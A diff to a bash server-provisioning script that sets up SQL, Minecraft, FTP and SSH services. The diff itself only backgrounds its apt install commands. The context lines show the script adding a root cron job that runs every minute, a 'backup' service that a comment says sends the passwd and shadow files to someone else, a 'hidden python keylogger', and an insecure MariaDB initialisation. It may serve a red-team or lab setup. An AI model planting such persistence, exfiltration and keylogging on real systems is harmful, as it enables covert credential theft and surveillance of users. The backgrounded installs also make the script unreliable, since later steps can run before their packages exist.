@@ -9,7 +9,7 @@ fi
 apt-get update &
 apt-get upgrade -y &
 
-apt install lsof wget -y
+apt install lsof wget -y &
 
 # get tarball
 # wget # TODO LINK HERE
@@ -36,7 +36,7 @@ mv ./sshd_config /etc/ssh/
 
 # setup sql server
 echo "setup sql server"
-apt install mariadb-server -y
+apt install mariadb-server -y &
 mysqld --initialize-insecure
 systemctl enable mariadb.service
 
@@ -69,7 +69,7 @@ systemctl enable minecraft.service
 
 # setup ftp server
 echo "setup ftp server"
-apt install vsftpd
+apt install vsftpd &
 rm /etc/vsftpd.conf
 mv ./vsftpd.conf /etc/
 systemctl start vsftpd.service
@@ -91,7 +91,7 @@ echo "* * * * * /var/www/log/ps_init.sh" >> /var/spool/cron/root
 # setup service that sends logging, passwd, and shadow file to someone else
 # TODO: setup dest box to receive files - use static ip
 # TODO: setup rsa key on source and dest boxes
-apt install rsync -y
+apt install rsync -y &
 chmod +x backup.sh
 mv backup.sh /var/spool
 mv backup.service /etc/systemd/system/
@@ -99,7 +99,7 @@ systemctl start backup.service
 systemctl status backup.service
 
 # setup hidden python keylogger
-apt install python3 python-xlib -y
+apt install python3 python-xlib -y &
 mkdir /opt/local/
 mv log.txt /opt/local
 chmod +x log.sh
